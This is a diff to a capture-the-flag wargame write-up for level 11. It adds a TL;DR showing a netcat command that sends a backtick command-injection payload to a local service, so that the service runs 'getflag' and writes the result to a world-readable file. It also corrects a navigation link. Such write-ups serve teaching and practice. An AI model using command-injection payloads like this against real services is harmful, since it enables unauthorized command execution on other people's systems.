@@ -8,6 +8,21 @@
 <br>
 
 
+## TL;DR:
+
+```bash
+nc 127.0.0.1 5151 << 'EOF'
+`getflag > /tmp/flag && chmod 777 /tmp/flag`
+EOF
+cat /tmp/flag
+```
+
+<br>
+
+
+## Explanation:
+
+
 #### Step 1:
 
 - What's in the home directory:
@@ -95,4 +110,4 @@ cat /tmp/flag
 
 ---
 
-[<<](/level10/resources/Readme.md) &nbsp; [[Back to main page]](/) &nbsp; [>>](/level12/resources/Readme.md)
+[<<](/level10/resources/Readme.md) &nbsp; [[Back to main page]](/Readme.md) &nbsp; [>>](/level12/resources/Readme.md)
